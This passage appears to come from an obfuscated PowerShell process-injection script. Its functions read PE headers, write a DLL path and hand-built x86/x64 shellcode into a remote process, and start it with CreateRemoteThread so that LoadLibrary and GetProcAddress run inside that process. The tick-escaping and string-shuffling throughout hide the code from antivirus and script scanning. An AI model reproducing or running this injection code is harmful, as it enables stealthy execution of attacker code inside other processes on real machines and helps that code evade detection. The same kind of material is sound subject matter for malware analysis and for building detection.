		[IntPtr]${UnmANAg`E`dpeB`Y`TeS} =   ${Jk5`m`BH}::("{3}{2}{1}{0}"-f 'Global','H','lloc','A').Invoke(${PE`Byt`ES}."LEn`G`Th")
		  ${J`k5mBh}::("{1}{0}"-f'y','Cop').Invoke(${P`e`Bytes}, 0, ${U`N`M`AnagEd`peb`yTEs}, ${PE`ByTes}."L`ENg`Th") | &("{2}{1}{0}"-f'll','u','Out-N')
		
		${NTHEaDe`RSi`NFO} = &("{3}{5}{1}{4}{2}{0}" -f 'ers','ma','eNtHead','G','g','et-I') -PEHandle ${Un`MANAGE`DpE`B`ytes} -Win32Types ${WiN32t`Y`pes}
		
		${p`e`iNfO} | &("{0}{2}{1}{3}"-f'Ad','em','d-M','ber') -MemberType ("{0}{1}{3}{2}"-f 'NoteP','r','y','opert') -Name ("{2}{1}{0}" -f '64Bit','E','P') -Value (${n`TheAdeRS`in`Fo}."p`E64b`It")
		${P`e`iNfO} | &("{0}{1}{2}" -f'Add-','Mem','ber') -MemberType ("{2}{0}{3}{1}"-f'oteP','perty','N','ro') -Name ("{0}{3}{1}{4}{5}{2}" -f 'Orig','lIm','e','ina','ageB','as') -Value (${nT`HeaderSIn`Fo}."ImA`Ge_N`T_H`EADe`RS"."O`PTIOnAl`HE`AdeR"."imAGE`BAsE")
		${p`eINfo} | &("{0}{2}{1}" -f'Add-M','ber','em') -MemberType ("{1}{2}{0}" -f 'ty','NoteP','roper') -Name ("{0}{1}{2}{3}"-f 'S','izeOfIma','g','e') -Value (${NTheA`DErsIn`Fo}."Im`AGe_Nt_hE`ADeRS"."opTion`A`lHEad`Er"."sI`ZeOfI`maGe")
		${pe`INFo} | &("{0}{2}{1}" -f 'Add','Member','-') -MemberType ("{1}{2}{0}" -f 'rty','NotePr','ope') -Name ("{3}{2}{0}{1}"-f'a','ders','He','SizeOf') -Value (${NT`H`E`ADeRSinfO}."iM`Ag`E_`Nt_HeADe`Rs"."oPti`ONAl`HeAd`ER"."SiZEofhE`A`d`ers")
		${Pei`NFo} | &("{0}{2}{1}"-f 'Add','ember','-M') -MemberType ("{1}{2}{3}{0}"-f 'rty','N','oteProp','e') -Name ("{3}{1}{0}{2}"-f'acter','Char','istics','Dll') -Value (${n`ThEAD`e`Rs`iNfO}."IMaGE_nt_`HeAD`ERs"."O`ptI`ONALhEADeR"."DLLChar`A`CtER`isTicS")
		
		 (  gET-varIabLE ("{1}{0}"-f'BH','Jk5m'))."va`lUe"::("{2}{1}{0}" -f'Global','reeH','F').Invoke(${UNMan`AgeDPE`ByT`es})
		
		return ${PeI`NFO}
	}



	Function Ge`T`-p`eDE`TaiLeDinFo
	{
		Param(
		[Parameter( posItioN = 0, MAndaTOry = ${tr`UE})]
		[IntPtr]
		${PEh`AN`DlE},
		
		[Parameter(PoSitiON = 1, maNDatoRy = ${tR`Ue})]
		[System.Object]
		${w`iN3`2tYPES},
		
		[Parameter(poSITiON = 2, mAndaTory = ${Tr`Ue})]
		[System.Object]
		${wiN32Co`NsTa`N`TS}
		)
		
		if (${PE`haNd`lE} -eq ${n`ULl} -or ${p`ehaNdLe} -eq  ( geT-cHiLDITEm ("{2}{1}{3}{0}" -f'bLE:Jp7D','arI','V','A') )."va`Lue"::"ZE`Ro")
		{
			throw ("{7}{3}{4}{0}{2}{6}{5}{1}"-f'null','ro',' or IntP','l','e is ','r.Ze','t','PEHand')
		}
		
		${p`eI`Nfo} = &("{2}{1}{0}" -f'ct','je','New-Ob') ("{2}{0}{1}{3}"-f's','tem.O','Sy','bject')
		
		${n`ThEade`R`SInFO} = &("{4}{3}{1}{0}{2}" -f'NtHe','mage','aders','et-I','G') -PEHandle ${p`eh`ANdLE} -Win32Types ${WIN3`2`Ty`PEs}
		
		${Pe`INFO} | &("{0}{1}{2}"-f 'Add-','Me','mber') -MemberType ("{2}{1}{0}"-f 'operty','Pr','Note') -Name ("{1}{2}{0}"-f'le','PEHan','d') -Value ${P`ehAND`le}
		${pEI`NfO} | &("{0}{2}{1}"-f'Add-M','ber','em') -MemberType ("{0}{3}{2}{1}" -f 'No','y','ert','teProp') -Name ("{0}{1}{4}{3}{2}" -f'IMAGE_N','T_','ADERS','E','H') -Value (${nThEAd`e`RSinFo}."IMAg`e_Nt_`Hea`D`ers")
		${p`e`inFO} | &("{0}{1}{2}" -f 'Add-Me','m','ber') -MemberType ("{1}{2}{3}{0}" -f'ty','NoteP','rope','r') -Name ("{1}{2}{0}{3}" -f'e','NtHe','ad','rsPtr') -Value (${N`Th`EaDer`sInfO}."nT`hEad`ER`sptR")
		${pe`In`FO} | &("{0}{2}{1}" -f 'Add-M','mber','e') -MemberType ("{2}{1}{0}" -f'y','rt','NotePrope') -Name ("{1}{0}"-f'it','PE64B') -Value (${N`ThEAde`R`s`iNfO}."p`e64bIT")
		${PEiN`Fo} | &("{1}{0}{2}" -f 'dd-Memb','A','er') -MemberType ("{0}{2}{1}{3}"-f'N','Proper','ote','ty') -Name ("{2}{1}{0}"-f'eOfImage','z','Si') -Value (${n`ThEADer`sIn`FO}."IM`AGE_NT_HeAd`e`Rs"."O`PT`IOnalhEAdeR"."SIzeoF`I`M`AGE")
		
		if (${PeI`NFo}."pE`64B`IT" -eq ${tR`Ue})
		{
			[IntPtr]${s`ecTiOn`hEADE`RPTR} = [IntPtr](&("{4}{6}{1}{5}{3}{2}{0}" -f'gned','igned','nsi','tAsU','Ad','In','d-S') ([Int64]${P`EInFO}."NtH`eA`DER`sPTR") (  (  IteM  ("{1}{2}{0}{3}"-f 'blE:jK','VArI','A','5MBH') )."VAl`Ue"::"SI`ZEoF"([Type]${win`32tYp`ES}."ImA`GE`_`Nt_HEadE`RS64")))
			${p`E`InfO} | &("{2}{0}{1}" -f'e','r','Add-Memb') -MemberType ("{1}{0}{2}" -f'eP','Not','roperty') -Name ("{3}{0}{4}{2}{1}"-f 'io','tr','P','Sect','nHeader') -Value ${SECTI`onHeaDe`R`ptR}
		}
		else
		{
			[IntPtr]${se`CTiOnHEa`d`ErpTR} = [IntPtr](&("{1}{0}{2}{4}{3}"-f'd-S','Ad','igne','IntAsUnsigned','d') ([Int64]${pEi`N`FO}."ntHea`DE`Rsp`TR") (  (dIR  ("{4}{1}{3}{2}{0}" -f'h','rIa','jK5MB','BlE:','vA') )."va`LUE"::"sIz`eoF"([Type]${W`i`N32Ty`pes}."iMAGE_nT_`HE`ADEr`S32")))
			${p`Ein`FO} | &("{0}{2}{1}" -f'A','ember','dd-M') -MemberType ("{2}{3}{1}{0}" -f'y','Propert','Not','e') -Name ("{1}{3}{2}{0}" -f'rPtr','Se','Heade','ction') -Value ${sect`I`oN`HeADerPtr}
		}
		
		if ((${N`TH`EAd`E`RsINFO}."ImA`Ge`_NT`_HEadERs"."F`i`lEhEADER"."cha`RACte`RIS`TiCs" -band ${W`in32`cO`N`stAnTs}."imag`e_`FiL`E_dLL") -eq ${Wi`N32cO`Nsta`NtS}."Im`AGE`_`Fi`LE_dll")
		{
			${P`E`INfo} | &("{2}{0}{1}"-f'd-Me','mber','Ad') -MemberType ("{3}{0}{2}{1}"-f'otePrope','ty','r','N') -Name ("{0}{1}{2}"-f 'F','ileTy','pe') -Value 'DLL'
		}
		elseif ((${NTheaD`Ersi`NFo}."iMA`Ge_N`T_heA`DE`Rs"."FiLeHe`AD`eR"."cH`ARa`cTeR`ISticS" -band ${WIN32`cON`st`ANTS}."imAGe`_f`iLe_E`Xe`cuTa`Bl`E_ima`gE") -eq ${win`32`c`ONST`AntS}."imAGe_FILe`_`ExE`Cu`T`A`B`LE_ImAGe")
		{
			${P`e`inFO} | &("{2}{1}{0}{3}"-f '-Membe','dd','A','r') -MemberType ("{0}{1}{2}" -f'No','teProper','ty') -Name ("{1}{0}" -f'ileType','F') -Value 'EXE'
		}
		else
		{
			Throw ("{3}{5}{1}{4}{2}{0}{6}"-f 'an ','file is ','ot ','P','n','E ','EXE or DLL')
		}
		
		return ${PEi`N`Fo}
	}
	
	
	Function ImpoRT-d`L`Linr`EMOtEpROce`SS
	{
		Param(
		[Parameter(PositIOn=0, maNdaToRy=${TR`UE})]
		[IntPtr]
		${REMot`E`PRO`cHAnDLe},
		
		[Parameter(poSiTIOn=1, manDATOrY=${Tr`UE})]
		[IntPtr]
		${IMPoRt`dL`lp`A`Thp`TR}
		)
		
		${P`Trs`ize} =  (geT-cHILDiTem  ("{0}{3}{1}{2}"-f'VaRIa','e:jK5','mBh','BL') )."V`ALue"::"Si`ZEOF"([Type][IntPtr])
		
		${i`M`PortDLL`pA`Th} =  (VAriABLE ("j"+"K"+"5mbh") -vAlueOn )::("{0}{2}{1}{3}" -f'PtrToS','rin','t','gAnsi').Invoke(${imp`ORtd`lLPATHP`TR})
		${DlLpat`hSi`ze} = [UIntPtr][UInt64]([UInt64]${im`porTDL`lPAtH}."l`ENgTH" + 1)
		${RimPoRtdl`LP`AT`H`PtR} = ${wiN3`2fuN`cti`OnS}."v`iR`Tua`LAllo`cEx"."i`Nv`Oke"(${Re`MO`TEpro`cHA`NdlE},   (  vaRiAbLE  ("{0}{1}" -f'jP7','d') )."VA`lUE"::"Z`ERO", ${dL`lPa`TH`sIzE}, ${wi`N32`CoNSt`ANtS}."M`em`_cOmMit" -bor ${Win3`2cO`NStA`N`TS}."me`M_rEs`e`RvE", ${wi`N3`2CoNStA`N`TS}."p`AGe_rea`d`WRItE")
		if (${riMp`OrtdL`LpAtH`p`Tr} -eq  (  iteM ("{2}{0}{1}{3}" -f 'r','iabLe:J','va','p7D'))."V`AluE"::"Z`ErO")
		{
			Throw ("{11}{10}{4}{5}{3}{1}{2}{6}{7}{8}{0}{9}" -f 'ce','in ','t','mory ','locate',' me','he remot','e ','pro','ss',' al','Unable to')
		}

		[UIntPtr]${nu`mbYt`eSwRI`TTen} =   ( GET-ItEM ("vaR"+"ia"+"ble"+":T72z")  )."vaL`UE"::"z`ERO"
		${S`UcC`eSs} = ${w`in3`2F`UnCTi`onS}."Wr`Ite`PRoc`eSSMe`MoRy"."I`NVoKE"(${rEM`Ot`epROCha`NdLE}, ${RI`MPORTDL`lPA`Thp`TR}, ${iM`POrtdlLPAt`H`ptR}, ${dLlpA`TH`S`ize}, [Ref]${n`UMBY`Te`SWR`ItteN})
		
		if (${Su`cC`EsS} -eq ${FA`lSE})
		{
			Throw ("{1}{5}{7}{3}{0}{2}{6}{8}{4}" -f 'ath to re','U','mote pro','LL p',' memory','nable to writ','c','e D','ess')
		}
		if (${D`LlPatHS`IzE} -ne ${nu`MByt`ESWRI`T`TEn})
		{
			Throw ((("{8}{3}{5}{0}{9}{17}{6}{15}{11}{14}{2}{18}{10}{12}{1}{7}{4}{13}{16}" -f ' the expected a','ath','riting a ','t','o ','e','of by',' t','DidnPQMt wri','mo','L ',' whe','p','load to the ','n w','tes','remote process','unt ','DL'))."rEPla`cE"(([CHAr]80+[CHAr]81+[CHAr]77),[sTriNG][CHAr]39))
		}
		
		${KERn`eL32`ha`Nd`LE} = ${WiN`32fUn`CTi`ONs}."GETmO`D`ULEh`ANDlE"."In`VoKE"(("{3}{1}{2}{0}"-f'l','rn','el32.dl','ke'))
		${l`O`ADl`iBRAry`AaddR} = ${WIN32fu`Nc`Ti`O`Ns}."GEtp`ROcaddr`ESS"."iN`V`oKE"(${KEr`N`e`l32hAN`dle}, ("{2}{3}{0}{1}"-f'r','yA','LoadLi','bra')) 
		
		[IntPtr]${DllaDD`R`esS} =  ${jP`7D}::"Ze`RO"
				if (${P`e`infO}."pE6`4BiT" -eq ${T`Rue})
		{
			${lo`ADlIBRAR`Ya`RE`T`MeM} = ${wiN`3`2FUn`cTIONs}."ViR`Tu`AlaLLOCEX"."In`Vo`kE"(${re`moTE`pRochA`NDle},  (Gi  ('Va'+'RIa'+'BlE:'+'Jp7D'))."val`UE"::"zE`Ro", ${d`ll`paTH`SiZe}, ${WIn32c`o`Ns`T`AntS}."mEM_C`OmM`iT" -bor ${WI`N3`2CoN`sTAntS}."ME`m_RE`SERVE", ${wi`N3`2CO`NSTAn`Ts}."PaGE`_rEA`dWritE")
			if (${lOA`DLibRA`RYar`Et`Mem} -eq  (varIaBle  ("j"+"p7d") -VaLuEONLY )::"Ze`RO")
			{
				Throw ("{11}{2}{8}{16}{13}{1}{15}{0}{21}{3}{18}{19}{7}{14}{10}{9}{4}{22}{20}{5}{6}{12}{17}" -f 'ry ','te mem','nable ',' ','urn','lu','e o','ss for ','to allo','ret','e ','U','f LoadLibrary','a','th','o','c','A','the remote',' proce','a','in',' v')
			}
			
			
			${l`oAd`lIB`RAr`ysc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${l`o`ADLiB`R`Arysc2} = @(0x48, 0xba)
			${L`OadLI`BRAR`ys`c3} = @(0xff, 0xd2, 0x48, 0xba)
			${lOadl`iB`RA`RYsC4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			${s`clE`N`gth} = ${LOadlibr`A`R`YS`c1}."le`N`gth" + ${l`OAdLIb`R`A`RysC2}."Le`NG`TH" + ${l`OAdlIB`RAry`Sc3}."LE`Ng`TH" + ${loadl`IBRaR`ySC4}."LE`NGTh" + (${p`TRsI`zE} * 3)
			${ScPs`M`EM} =  ${j`K5mbH}::("{2}{1}{3}{0}"-f'cHGlobal','l','A','lo').Invoke(${sclEn`gTh})
			${sC`p`Sm`EMoR`iGI`NaL} = ${Scp`s`MEM}
			
			&("{5}{0}{4}{3}{1}{2}" -f 'rite','sToMemo','ry','e','-Byt','W') -Bytes ${L`oADl`ibRa`Ry`sC1} -MemoryAddress ${s`C`psMEM}
			${ScPS`m`EM} = &("{1}{3}{5}{0}{4}{2}"-f 'sUnsi','Add-S','d','ignedInt','gne','A') ${S`c`PsMem} (${lOa`d`l`IBRary`sC1}."le`NG`Th")
			 ( GeT-Item ("{2}{1}{0}{3}" -f 'j','rIablE:','Va','K5MbH') )."vaL`Ue"::("{3}{2}{0}{1}"-f'reToP','tr','tu','Struc').Invoke(${RImP`o`R`Tdl`lPa`ThpTR}, ${scP`S`MEM}, ${FA`LSE})
			${s`cPSm`eM} = &("{4}{0}{3}{6}{2}{1}{5}"-f'd-','ntAsUn','edI','S','Ad','signed','ign') ${Sc`P`sMEM} (${P`TR`SizE})
			&("{5}{4}{2}{0}{1}{3}"-f'yte','sT','e-B','oMemory','it','Wr') -Bytes ${lO`Adl`IbRArYS`c2} -MemoryAddress ${s`cpSm`em}
			${ScPS`m`eM} = &("{3}{4}{0}{2}{1}"-f 'dIn','d','tAsUnsigne','Ad','d-Signe') ${SCp`SMeM} (${LO`ADLib`RArySC2}."lEn`gtH")
			  (VAriABlE ("{1}{0}" -f'k5mBh','J') -valuE)::("{0}{2}{3}{4}{1}"-f'St','Ptr','r','uctureT','o').Invoke(${l`oAd`L`ibrarY`AadDr}, ${S`CpS`MEm}, ${F`ALSE})
			${Sc`Ps`mEm} = &("{4}{0}{2}{1}{3}"-f 'dd-S','As','ignedInt','Unsigned','A') ${s`cPSM`Em} (${p`TRsi`Ze})
			&("{2}{1}{4}{3}{0}" -f 'Memory','es','Write-Byt','o','T') -Bytes ${lOAD`libRA`R`Ys`c3} -MemoryAddress ${SCpsM`em}
			${S`c`psMeM} = &("{1}{0}{3}{6}{4}{2}{5}" -f 'd','A','sUnsi','d-Si','ntA','gned','gnedI') ${Scp`sMeM} (${LOaDL`IbRa`RYS`C3}."Len`Gth")
			  ( ITem ("{2}{0}{1}" -f'iABLe:jK5M','Bh','vaR'))."vA`lue"::("{3}{0}{2}{1}"-f'uc','Ptr','tureTo','Str').Invoke(${Loa`dlIbRAryA`ReT`MeM}, ${Sc`PS`MeM}, ${FA`lse})
			${s`CPs`MEM} = &("{4}{3}{2}{0}{1}"-f 'Unsigne','d','gnedIntAs','Si','Add-') ${ScPs`mEm} (${PTR`SI`zE})
			&("{4}{3}{2}{1}{0}"-f'y','r','ToMemo','e-Bytes','Writ') -Bytes ${L`OaDLib`RaRy`SC4} -MemoryAddress ${sCP`sMem}
			${SCPs`Mem} = &("{0}{6}{1}{2}{3}{4}{5}" -f 'Add','n','tAsU','ns','igne','d','-SignedI') ${S`CPs`mem} (${LoA`DLi`BRAR`ySc4}."leng`Th")

			
			${Rsc`Ad`dr} = ${wIN32f`Un`cTIoNs}."Virtuala`L`LoceX"."iNV`okE"(${REM`o`TEp`ROchA`NdLe},   ( iTEm  ('variabLe'+':j'+'P7'+'D'))."vA`LuE"::"Ze`Ro", [UIntPtr][UInt64]${sc`lEnG`Th}, ${wI`N32`ConST`A`Nts}."M`eM_Co`mMIt" -bor ${w`I`N`32co`NstantS}."mEm`_`ResEr`Ve", ${WiN`32cO`NstA`N`TS}."pagE_E`X`Ec`U`Te_r`eADWRi`TE")
			if (${Rs`cA`ddR} -eq  (GET-ChiLDiTem  ("{0}{4}{2}{3}{1}" -f'v','p7d','aBL','E:j','ARi')  )."v`Alue"::"ze`RO")
			{
				Throw ("{17}{0}{8}{12}{4}{1}{10}{9}{7}{15}{14}{16}{6}{2}{18}{3}{11}{5}{13}"-f'l',' ','e','for','ry','shell','c',' re','locate','n the','i',' ',' memo','code','ote pr','m','o','Unable to a','ss ')
			}
			
			${s`Uc`cEss} = ${WIn32`F`UNc`T`ions}."W`Rit`Ep`RoCesSMeMOry"."in`VokE"(${Re`mOTE`PR`OCH`AnD`le}, ${R`SCaddR}, ${scpSMe`MOr`i`gi`NAl}, [UIntPtr][UInt64]${ScL`enG`TH}, [Ref]${N`Um`ByteS`written})
			if ((${sUcC`E`ss} -eq ${f`Al`Se}) -or ([UInt64]${nu`MbYTESWr`ITT`EN} -ne [UInt64]${s`CLENG`Th}))
			{
				Throw ("{8}{3}{1}{4}{7}{2}{0}{6}{5}"-f 'emote process me','he','ode to r','e to write s','l','ry.','mo','lc','Unabl')
			}
			
			${R`THREad`HAnDLE} = &("{1}{0}{4}{2}{3}" -f 'e-Cr','Invok','eThre','ad','eateRemot') -ProcessHandle ${ReMoTEPRo`c`H`An`DlE} -StartAddress ${R`SC`AddR} -Win32Functions ${Wi`N32`F`UncTioNs}
			${rESu`Lt} = ${WIn32fU`NcTiO`Ns}."WaItFOrsIng`le`oBjE`Ct"."iNvo`KE"(${Rth`Re`A`Dhandle}, 20000)
			if (${RES`Ult} -ne 0)
			{
				Throw ("{5}{7}{2}{1}{13}{4}{9}{3}{10}{0}{6}{12}{8}{11}" -f ' fai','moteT','eRe','cAddr','ad t','Call to C','l','reat','d','o call GetPro','ess','.','e','hre')
			}
			
			[IntPtr]${Re`T`URNv`ALm`eM} =   (  VARIAbLE  ("jK"+"5MbH")  )."VAl`UE"::("{2}{0}{1}" -f 'ocHGlo','bal','All').Invoke(${P`TrSi`Ze})
			${Res`U`Lt} = ${Wi`N`32FUnc`Tions}."R`eaDpR`OC`eSs`memORy"."in`Vo`kE"(${RemoTE`pRo`c`HAN`dlE}, ${loADli`BRArY`ArE`TMeM}, ${Re`TUrnvA`lMEM}, [UIntPtr][UInt64]${P`TRsizE}, [Ref]${nu`mby`Tesw`RitTEN})
			if (${RE`sU`lT} -eq ${Fal`Se})
			{
				Throw ("{2}{0}{3}{1}{5}{4}{8}{6}{9}{7}"-f 'al',' to','C','l','eadProc',' R','ss','ory failed','e','Mem')
			}
			[IntPtr]${d`lla`dd`Ress} =   ( geT-VAriAbLe  ("{0}{1}"-f 'J','k5mBH')  )."vA`LUE"::"PtRT`osT`Ructu`Re"(${R`EtuRnVAl`mem}, [Type][IntPtr])

			${wi`N32FUNCT`i`oNS}."ViRT`UalF`RE`eex"."Invo`ke"(${RE`MOteP`RoC`haN`dle}, ${loaDlI`B`R`Ary`ARETMem}, [UIntPtr][UInt64]0, ${WiN3`2`Con`stAntS}."meM_re`L`ea`se") | &("{1}{0}"-f 'l','Out-Nul')
			${w`in`3`2`FUnctIONS}."ViRtU`A`Lfre`eEX"."I`NvOke"(${reMO`TePR`O`CHAnD`Le}, ${RSC`AdDr}, [UIntPtr][UInt64]0, ${w`IN32cOns`TAN`Ts}."MeM_ReLe`A`se") | &("{0}{2}{1}"-f'Out','l','-Nul')
		}
		else
		{
			[IntPtr]${r`T`H`Read`HandLE} = &("{7}{3}{1}{4}{6}{0}{5}{2}"-f 'teRem','ke-C','ad','o','r','oteThre','ea','Inv') -ProcessHandle ${r`eMOtE`prOCH`A`NDle} -StartAddress ${l`Oa`dLIbra`RYaa`D`dr} -ArgumentPtr ${ri`MpOR`Td`llpaT`hPTr} -Win32Functions ${w`in32`FUN`Ctions}
			${R`E`sult} = ${win32FUN`CT`ionS}."W`AI`TfO`RS`iNGLeoB`JECt"."IN`VOkE"(${RThrE`A`DhAn`D`le}, 20000)
			if (${RE`sulT} -ne 0)
			{
				Throw ("{3}{10}{0}{4}{5}{1}{7}{8}{2}{9}{6}"-f 'teRemot','G','dd','Call to ','e','Thread to call ','failed.','etPro','cA','ress ','Crea')
			}
			
			[Int32]${EXitC`odE} = 0
			${r`E`SulT} = ${wi`N3`2fuNC`T`IOnS}."gEte`XITCoD`EthR`E`Ad"."I`NVOkE"(${rt`HrEaD`h`ANDLE}, [Ref]${EXiT`c`ODe})
			if ((${r`eSU`Lt} -eq 0) -or (${eX`it`C`odE} -eq 0))
			{
				Throw ("{2}{1}{6}{7}{3}{0}{5}{4}" -f 'tCo','l','Cal','i','hread failed','deT',' to Get','Ex')
			}
			
			[IntPtr]${D`lLa`dDRess} = [IntPtr]${exITC`o`de}
		}
		
		${W`in32F`UnCt`ioNS}."V`IRTua`lF`REEex"."I`Nv`OKe"(${reMotEp`RO`C`h`An`DlE}, ${ri`MpORTD`llPA`THP`TR}, [UIntPtr][UInt64]0, ${w`In32Co`NST`A`NTs}."M`Em_re`LEa`SE") | &("{0}{2}{1}" -f 'Out','ull','-N')
		
		return ${D`LlA`ddReSS}
	}
	
	
	Function GE`T`-rEmotEprOC`ADDr`e`SS
	{
		Param(
		[Parameter(POsiTION=0, mANDATORy=${tr`Ue})]
		[IntPtr]
		${Re`M`otepROC`hAnDle},
		
		[Parameter(POsitIon=1, maNdatOrY=${Tr`Ue})]
		[IntPtr]
		${r`EmO`TeDlLh`ANdle},
		
		[Parameter(poSition=2, maNDaTOry=${t`Rue})]
		[String]
		${f`UNC`TION`NA`mE}
		)

		${pt`Rs`Ize} =  (  gET-vARiaBlE ("{2}{1}{0}"-f 'H','k5mb','j')  -ValUEo )::"siz`eoF"([Type][IntPtr])
		${funCTi`ON`N`AmeP`Tr} =   ${j`k5mBh}::("{2}{4}{3}{0}{1}"-f 'obal','Ansi','S','ngToHGl','tri').Invoke(${fUNcT`i`O`NnAMe})
		
		${fUnCT`IO`NNameS`IZe} = [UIntPtr][UInt64]([UInt64]${fUN`CTionNa`Me}."lE`NgtH" + 1)
		${rfUNcNA`Mep`TR} = ${w`IN32`FuNct`I`ons}."vir`TuA`laLlO`C`Ex"."i`N`VOKE"(${RE`M`otEPR`oc`ha`NdlE},   ${J`p7d}::"z`ERo", ${F`Unc`Tion`NaM`esiZE}, ${wI`N32`CoN`STanTS}."Me`m_cOM`mIt" -bor ${wiN32`CONSt`A`NtS}."Me`M`_R`eSeRve", ${w`in32coN`st`A`Nts}."p`Ag`e_rEa`Dw`RITe")
		if (${Rfu`NCnA`mEPTR} -eq  ( gEt-vaRiaBLe  ("Jp7"+"d")  -Va )::"ze`Ro")
		{
			Throw ("{1}{7}{5}{4}{9}{6}{8}{0}{3}{2}" -f'he remote ','Unable ','ess','proc','me','e ','y','to allocat',' in t','mor')
		}

		[UIntPtr]${nU`M`ByteSwRiT`TEn} =   (vaRIABle ('t7'+'2Z')  -VaLUeo  )::"z`eRo"
		${SucC`E`Ss} = ${Win`32f`UNct`io`Ns}."WR`It`Eproc`ESSmEm`orY"."iN`Vo`KE"(${re`m`O`T`eprochAnDLe}, ${rfUN`cNa`MEp`TR}, ${F`UNC`TiOnnA`m`ePtR}, ${fu`NcTiONn`A`MESiZE}, [Ref]${nUm`B`YteswRItTEn})
		  ${j`K5mbh}::("{0}{2}{3}{1}" -f 'Fr','l','eeHGlob','a').Invoke(${F`U`NCTiOnnAM`E`pTR})
		if (${sU`c`cEsS} -eq ${f`ALSE})
		{
			Throw ("{9}{7}{2}{3}{10}{1}{14}{0}{11}{4}{5}{13}{6}{8}{12}"-f ' to remote','rite DLL ','le',' t','p','rocess ','e','ab','m','Un','o w',' ','ory','m','path')
		}
		if (${funcT`I`onnaM`eSIzE} -ne ${nUMBy`T`ESW`R`itTen})
		{
			Throw ((("{17}{16}{19}{4}{0}{21}{20}{5}{10}{18}{7}{1}{22}{2}{9}{12}{8}{11}{13}{14}{6}{3}{15}" -f' ','n ','i','to ','t write the','ed am',' ','s whe','LL ','tin','ount ','path to l','g a D','o','ad','the remote process','0','Didn{','of byte','}','ect','exp','wr'))  -F  [cHAr]39)
		}
		
		${kE`RNe`L`32`HANDLe} = ${w`In32funC`Ti`ONS}."G`E`Tmod`ULEhaNDle"."iNvo`ke"(("{0}{2}{1}"-f 'k','l32.dll','erne'))
		${g`EtPRocaddRe`Ss`AD`Dr} = ${Wi`N32FUN`c`Tions}."GETprOC`A`Dd`RESS"."i`NvOkE"(${K`eRNeL32HA`Nd`LE}, ("{2}{1}{0}"-f 'dress','tProcAd','Ge')) 

		
		${GetP`Roc`A`D`DrEsSretm`Em} = ${w`in32FuNct`iO`NS}."vIrTUAlA`LLO`c`eX"."inv`O`KE"(${REMoT`epRO`ch`A`NDLe},  ${J`p7D}::"ZE`Ro", [UInt64][UInt64]${P`TR`siZe}, ${W`in`32CoNStANTs}."mE`M_comm`iT" -bor ${w`in32`CoNstanTS}."Me`M_R`eSeR`VE", ${wIN`3`2COn`StAnTS}."PaGE_re`AdW`RiTE")
		if (${gEtP`RO`caddre`s`srE`TmEM} -eq  ${jP`7D}::"ze`Ro")
		{
			Throw ("{14}{4}{10}{15}{12}{5}{20}{22}{8}{24}{18}{16}{13}{23}{1}{6}{19}{11}{2}{21}{3}{0}{17}{7}{9}" -f 'et',' re','a','of G','o alloc','t','tur','Addre','e','ss','ate ','v','ory in ','ocess fo','Unable t','mem','pr','Proc','e ','n ','he ','lue ','r','r the','mot')
		}
		
		

		[Byte[]]${Ge`T`p`ROcAD`DREsssc} = @()
		if (${pEI`N`FO}."P`E64`Bit" -eq ${T`Rue})
		{
			${g`E`TP`Roc`AdDRE`SSSC1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${ge`TP`ROCa`dd`RESS`Sc2} = @(0x48, 0xba)
			${gETp`RoCadD`R`essSc3} = @(0x48, 0xb8)
			${GetPRocA`DdR`eSSs`c4} = @(0xff, 0xd0, 0x48, 0xb9)
			${ge`TPROCa`DDRes`SsC5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${g`e`TpRo`CAd`D`REsSSC1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${geT`pROca`Dd`R`eSSSC2} = @(0xb9)
			${G`EtPrO`caD`DRes`SsC3} = @(0x51, 0x50, 0xb8)
			${GEt`pR`oc`ADdResssC4} = @(0xff, 0xd0, 0xb9)
			${g`Etp`RoC`ADd`R`esssC5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${sCL`eNG`Th} = ${gE`TprOC`AdDres`SSc1}."Le`N`GTH" + ${GeT`P`R`oCAdDrES`SSC2}."L`eNGth" + ${GE`T`prOC`AdDresSsc3}."l`enGTh" + ${GetP`RoCa`DDReSS`sc4}."l`ENGTh" + ${gET`PRO`cA`DdrESssc5}."len`gth" + (${P`T`RsizE} * 4)
		${s`CPsMem} =   (vARiABle  ("{2}{0}{1}"-f'K5mb','h','J')  -VAluEO)::("{1}{2}{0}"-f 'l','A','llocHGloba').Invoke(${SCLEn`G`TH})
		${Scp`smeMo`R`iGiNAL} = ${Sc`p`sMeM}
		
		&("{3}{1}{0}{2}{4}" -f 'BytesTo','-','M','Write','emory') -Bytes ${getpRo`cadD`R`esS`Sc1} -MemoryAddress ${S`C`psmEm}
		${S`cpS`mem} = &("{2}{1}{0}{3}{4}{7}{5}{6}"-f'dIntAs','Signe','Add-','U','ns','e','d','ign') ${sc`Ps`MEm} (${g`ETpR`o`C`AddrEssS`C1}."lEN`GTh")
		 ${Jk`5MBH}::("{2}{0}{1}"-f 'r','uctureToPtr','St').Invoke(${R`emo`TEDlLHa`NDle}, ${Sc`PSm`eM}, ${fA`L`sE})
		${sCpS`m`em} = &("{3}{1}{0}{2}" -f'tAsU','-SignedIn','nsigned','Add') ${SC`PS`MEM} (${ptr`Si`Ze})
		&("{1}{4}{2}{0}{5}{3}" -f 'esToMem','Wri','e-Byt','ry','t','o') -Bytes ${G`etp`RoCa`DDRES`Ssc2} -MemoryAddress ${SCP`sM`eM}
		${scPS`m`em} = &("{1}{4}{2}{6}{0}{3}{5}" -f'n','Add-S','tA','s','ignedIn','igned','sU') ${SCp`SmEM} (${g`E`TProc`ADDRE`sSs`C2}."LE`Ngth")
		  (get-variaBle ('jK5Mb'+'h') )."vAl`Ue"::("{3}{0}{2}{1}"-f'tr','ToPtr','ucture','S').Invoke(${rF`UNcNA`M`Ep`TR}, ${ScPsM`EM}, ${FaL`SE})
		${sC`p`SmEM} = &("{2}{3}{1}{0}" -f'ned','g','Add-SignedIntAsUn','si') ${scpS`MEM} (${ptrs`ize})
